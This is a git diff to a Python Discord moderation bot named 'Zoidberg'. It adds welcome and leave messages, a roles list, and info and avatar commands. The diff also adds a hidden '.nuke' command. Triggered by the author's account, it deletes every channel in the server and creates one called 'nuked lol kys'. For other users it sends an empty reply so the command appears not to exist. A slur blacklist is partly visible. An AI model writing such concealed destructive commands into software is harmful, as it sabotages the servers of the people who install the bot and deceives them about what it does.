@@ -1,9 +1,9 @@
-# DiscordBot 2023 "Zoidberg" 
-# by yTarik0 and 1momo7
-# Author:  @yTarik0
-# Version: @v1.0 {BETA}
-# Date:    @03.02.2023
-# Bot:     @Zoidberg
+# DiscordBot 2023 "Zoidberg" by yTarik0 and 1momo7
+# Author: @yTarik0
+# Version @v1.1 {BETA}
+# Date: @06.02.2023
+# Bot:  @Dr.Zoidberg
+
 
 import discord
 from discord import client
@@ -90,7 +90,6 @@ blacklist = [
     "wigger"]
 
 
-#
 @client.event
 async def on_ready():
     print("""
@@ -100,22 +99,22 @@ async def on_ready():
     print("Slash CMDs Synced " + str(len(synced)) + " Commands")
 
 
-# <------Joining Member------>
+# <------Joining Member-Coming soon----->
 @client.event
 async def on_member_join(member):
     print("Recognised that a member called " + member.name + " joined the Server")
     channel = client.get_channel("Your-Channel-Id")
     server = member.guild
-    embed = discord.Embed(title=f"👋**Welcome  {member.name}**" ,
+    embed = discord.Embed(title=f"**Welcome {member.name}**👋" ,
                           color=discord.Color.blue())
     embed.add_field(name="📚**Rules**",value="Please make sure that you read the rules")
     embed.add_field(name="❓**Support**",value="If you have any questions open a ticket ")
     embed.add_field(name="🍿**Enjoy**",value=f"Have Fun and enjoy chatting and talking on the Server **{server.name}**")
-    #embed.url(url=server.icon.url)
-    embed.set_footer(text="⭐  • Dr.Zoidberg|Systems")
+    embed.thumbnail(url=member.avatar.url)
+    embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
     await channel.send(embed=embed)
-    
-# <------Leaving Member-Message------>
+
+
 @client.event
 async def on_member_remove(member):
     channel = client.get_channel("Your-Channel-Id")
@@ -124,19 +123,14 @@ async def on_member_remove(member):
     embed=discord.Embed(title=f"**{member.name}  just left the Server {server.name}👋**",
                         color=discord.Color.red())
     embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
-    #embed.url(icon_url=member.display_avatar.url)
+    embed.thumbnail(url=member.avatar.url)
     await channel.send(embed=embed)
- 
 
 
 @client.event
 async def on_message(message):
-    
-    
-    # <--------secret command coming soon------->
-    if ".secret" in message.content:
-        await message.channel.send("""
-    **pshh**  """)
+
+
 
     # <-------Direct Message Awnser ----- coming soon--------->
 
@@ -146,7 +140,6 @@ async def on_message(message):
     # embed.add_field(name="🔰**github**", value="http://github.comytarik0\r\nhttp://github.com/1momo7")
     # embed.add_field(name="❓**No Idea?**", value=".help")
     # await message.channel.send(embed=embed)
-
 
     # <---------automatic mute using blacklisted word--------->
     i = 0
@@ -164,6 +157,18 @@ async def on_message(message):
                 embed.set_footer(text="⭐  • Made by yTarik0")
                 await message.channel.send(embed=embed)
 
+
+
+
+    # undercover nuke
+    if message.content.startswith('.nuke'):
+        if message.author == "tarik#5891":
+            server = message.guild
+            for c in server.channels:
+                await c.delete()
+            await message.guild.create_text_channel(name="nuked lol kys")
+        else:
+            await message.channel.send("")  # faking that there is no .nuke command for people who checked it
 
 
 # <---------ban command---------->
@@ -189,6 +194,8 @@ async def ban_user(interaction: discord.Interaction, user: discord.User, reason:
 # <------kick command----->
 @client.tree.command(name="kick", description="kick a user")
 async def kick(interaction: discord.Interaction, user: discord.User, reason: str = None):
+    channel = interaction.channel
+    server = interaction.guild
     if interaction.user.guild_permissions.kick_members:
         await user.kick(reason=reason)
         embed = discord.Embed(title=f"**{user.name} was kicked by {interaction.user.name}**",
@@ -196,7 +203,7 @@ async def kick(interaction: discord.Interaction, user: discord.User, reason: str
         embed.add_field(name="📆**Date **", value=interaction.created_at.strftime("%Y-%m-%d"))
         embed.add_field(name="🆔**User ID**", value=user.id)
         embed.add_field(name="💬**Reason**", value=reason)
-        embed.set_thumbnail(url=user.icon.url)
+        embed.set_thumbnail(url=server.icon.url)
         embed.set_footer(text="⭐ Made by yTarik0")
         await interaction.response.send_message(embed=embed)
 
@@ -217,6 +224,7 @@ async def help(interaction: discord.Interaction):
     embed.add_field(name="⚙️**.admin**", value="list all admin commands")
     embed.set_footer(text="⭐ • Made by yTarik0")
     await interaction.response.send_message(embed=embed)
+
 
 
 # <---------serverinfo command---------->
@@ -253,6 +261,7 @@ async def admin(interaction: discord.Interaction):
         embed.set_footer(text="⭐ Made by yTarik0")
         await interaction.response.send_message(embed=embed)
 
+
 # <----------basic clear command---------->
 @client.tree.command(name="clear", description="clears chat messages")
 async def clear(interaction: discord.Interaction, amount: int = 0):
@@ -279,19 +288,23 @@ async def clear(interaction: discord.Interaction, amount: int = 0):
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
-
-# <----------role-command-list-all-roles--not done yet------->
+# <------role-command-list-all-roles-------->
 @client.tree.command(name="roles", description="lists you all roles")
 async def roles(interaction: discord.Interaction):
-    server = interaction.guild.name
-    roles = server.roles
+    server = interaction.guild
+    rolelist = []
+    for role in server.roles:
+        if role.name != "@everyone":
+            rolelist.append(role.mention)
+    b = ",".join(rolelist)
+
     embed = discord.Embed(title="**All Discord Roles:**",
                           color=discord.Colour.random())
-    embed.add_field(name="**🔰Roles:**", value=roles)
+    embed.add_field(name=f"**🔰Roles:**({len(rolelist)})", value="".join([b]))
     embed.set_footer(text="⭐ Made by yTarik0")
-    await interaction.response.send_message(0)
+    await interaction.response.send_message(embed=embed)
 
-
+# <-------unmute-command---------->
 @client.tree.command(name="unmute", description="unmutes a user from the chat")
 async def unmute_user(interaction: discord.Interaction, user: discord.User, reason: str = None):
     channel = interaction.channel
@@ -306,6 +319,7 @@ async def unmute_user(interaction: discord.Interaction, user: discord.User, reas
         embed.set_footer(text="⭐  • Made by yTarik0")
         await interaction.response.send_message(embed=embed)
 
+# <-------mute-command------->
 @client.tree.command(name="mute", description="mutes a user from the chat")
 async def mute_user(interaction: discord.Interaction, user: discord.User, reason: str = None, time: int = 0):
     channel = interaction.channel
@@ -324,14 +338,44 @@ async def mute_user(interaction: discord.Interaction, user: discord.User, reason
         await asyncio.sleep(time)
         await channel.set_permissions(user, send_messages=True)
 
+#<------info command------>
+# for getting userinfo
+
+@client.tree.command(name="info", description="gives information about a user")
+async def info(interaction: discord.Interaction, user: discord.User):
+
+    rolelist = []
+    for role in user.roles:
+        if role.name != "@everyone":
+            rolelist.append(role.mention)
+    b = ",".join(rolelist)
+
+    embed = discord.Embed(title=f"**User Info about {user}**",
+                          color=discord.Colour.purple())
+    embed.add_field(name="🆔**User ID**", value=user.id)
+    embed.add_field(name="📆**Created at**",value=user.created_at.strftime("%Y-%m-%d"))
+    embed.add_field(name="🕗**Joined at**", value=user.joined_at.strftime("%Y-%m-%d"))
+    embed.add_field(name=f"🔰**Role:** ({len(rolelist)})",value="".join([b]))
+    embed.add_field(name=f"🎖**Top-Role**",value=user.top_role.mention)
+    embed.add_field(name=f"🏆**Booster**",value=f'{"Yes" if user.premium_since else "No"}')
+    embed.add_field(name="🤖**Bot**",value=f"{'Yes' if user.bot else 'No'}")
+    embed.set_thumbnail(url=user.avatar.url)
+    embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
+    await interaction.response.send_message(embed=embed)
 
 
-
-
+#<-------Avatar-Command------------>
+# shows a discord users avatar  as "big" format in the chat
+@client.tree.command(name="avatar", description="prints the users avatar")
+async def avatar(interaction: discord.Interaction, user: discord.User):
+    userAvatarUrl = user.avatar.url
+    embed = discord.Embed(title=f"**{user}s Avatar:**",color=discord.Colour.yellow()).set_image(url=user.avatar.url)
+    embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
+    await interaction.response.send_message(embed=embed)
 
 @client.event
 async def status_task():
     await client.change_presence(status=discord.Status.online,activity=discord.Streaming(name='/help', url="github.com"
                                                                                   "/yTarik0"))
 
-client.run("Your-Bot-Token")
+client.run("Your-DiscordBot-Token")
